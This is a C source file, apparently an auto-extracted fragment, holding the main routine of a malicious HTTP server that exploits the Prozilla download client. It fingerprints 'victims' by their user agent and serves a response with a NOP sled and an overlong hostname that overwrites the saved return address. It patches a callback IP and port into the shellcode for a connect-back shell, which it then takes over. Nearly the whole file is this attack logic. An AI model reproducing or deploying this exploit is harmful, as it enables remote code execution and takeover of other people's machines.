#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
struct sockaddr_in {int /*<<< orphan*/  sin_addr; } ;
struct sockaddr {int dummy; } ;
typedef  int /*<<< orphan*/  client_request ;

/* Variables and functions */
 int EOF ; 
 int MAX_RESPONSE ; 
 scalar_t__ TRUE ; 
 int accept (int,struct sockaddr*,int*) ; 
 int atoi (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  close (int) ; 
 int /*<<< orphan*/  exit (int) ; 
 int find_xor (int,int,int) ; 
 scalar_t__ fork () ; 
 int /*<<< orphan*/  fprintf (int /*<<< orphan*/ ,char*,...) ; 
 int /*<<< orphan*/  free (struct sockaddr_in*) ; 
 int getopt (int,char**,char*) ; 
 char* inet_ntoa (int /*<<< orphan*/ ) ; 
 int init_socket (struct sockaddr_in*,struct sockaddr_in*,int*) ; 
 scalar_t__ malloc (int) ; 
 int /*<<< orphan*/  memset (char*,int,int) ; 
 int /*<<< orphan*/  optarg ; 
 int /*<<< orphan*/  perror (char*) ; 
 int /*<<< orphan*/  printf (char*) ; 
 scalar_t__ read (int,char*,int) ; 
 int /*<<< orphan*/  real_response ; 
 int send (int,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  send_end (int) ; 
 int /*<<< orphan*/  send_hostname (int) ; 
 int /*<<< orphan*/  send_nop (int) ; 
 int /*<<< orphan*/  send_start (int) ; 
 int /*<<< orphan*/  shell (int) ; 
 int /*<<< orphan*/  shellcode ; 
 int /*<<< orphan*/  sscanf (int /*<<< orphan*/ ,char*,int*,int*,int*,int*) ; 
 int /*<<< orphan*/  stderr ; 
 int /*<<< orphan*/  strlen (int /*<<< orphan*/ ) ; 
 scalar_t__ strstr (char*,char*) ; 
 int /*<<< orphan*/  usage (char*) ; 

int main(int argc,char **argv)
{
   /* ip patch position */
   int    i=194;
   int    opt_p=0,opt_c=0;
   int    port,porthigh,portlow;
   int    c,f;
   int    control;
   int    connection,from_len;
   int    ip1,ip2,ip3,ip4;
   char   http_response [2048];
   char   client_request[2048];
   struct sockaddr_in *control_addr = (struct sockaddr_in *)malloc(sizeof(struct sockaddr_in));
   struct sockaddr_in *from_addr    = (struct sockaddr_in *)malloc(sizeof(struct sockaddr_in));

   while((c=getopt(argc, argv ,"hc:p:"))!=EOF) {
           switch (c) {
               case 'h':
                   usage(argv[0]);
               case 'c':
                   opt_c=1;
                   sscanf(optarg, "%d.%d.%d.%d", &ip1, &ip2, &ip3,&ip4);
                   break;
               case 'p':
                   opt_p=1;
                   port = atoi(optarg);
                   if ((port <= 0) || (port > 65535)) {
                       fprintf(stderr, "Invalid port.\n\n");
                       exit(1);
                   }
           }
   }
   if(opt_p) {
       porthigh = (port & 0xff00) >> 8;
       portlow  = (port & 0x00ff);
   }
   else {
       port     = 8080;
       porthigh = (port & 0xff00) >> 8;
       portlow  = (port & 0x00ff);
   }
   if(!opt_c) {
       usage(argv[0]);
   }
   memset(http_response,0x0,MAX_RESPONSE);
   control = init_socket(control_addr,from_addr,&from_len);

   /* patch ip */
   i = find_xor(ip1,i,6);
   i = find_xor(ip2,i,6);
   i = find_xor(ip3,i,6);
   i = find_xor(ip4,i,6);

   /* patch port */
   i  = 207;
   i = find_xor( porthigh,i,5);
   i = find_xor( portlow ,i,5);

   while(TRUE) {
       if((connection=accept(control,(struct sockaddr *)from_addr,&from_len))==-1) {
           exit(1);
       }

       fprintf(stderr,"[+] Victim at : %s\n", inet_ntoa(from_addr->sin_addr));
       if (read(connection,client_request,sizeof(client_request))==0) {
           exit(1);
       }

       /* Victim Responded */
               if(strstr(client_request,"Prozilla"))
               {
                       fprintf(stderr,"[+] Victim using Prozilla.\n");
                       f=1;
               }
               else {
                       if(strstr(client_request,"SSSS")) {
                   fprintf(stderr,"Nice , Victim Responded!\n");
               shell(connection);
                       }
                       else {
                               fprintf(stderr,"[+] Victim is not using Prozilla! Sending a normal response.\n");
                               if(send(connection,real_response,strlen(shellcode),0)==-1) {
                               perror("send");
                               }
               }
               }
               if(f==1) {
               /* HTTP */
               send_start(connection);
               /* nop sled [nop@] */
               send_nop(connection);
               /* Overwrite Saved Ret , return to heap */
               send_hostname(connection);
               /* HTTP END */
               send_end(connection);
                       f=0;
               }
       close(connection);
       memset(client_request,0x0,sizeof(client_request));

       if (fork()==0) {
               free(from_addr);
               free(control_addr);
               exit(0);
       }
       else {
           close(connection);
       }

   }

   printf("Done");
   return 0;
}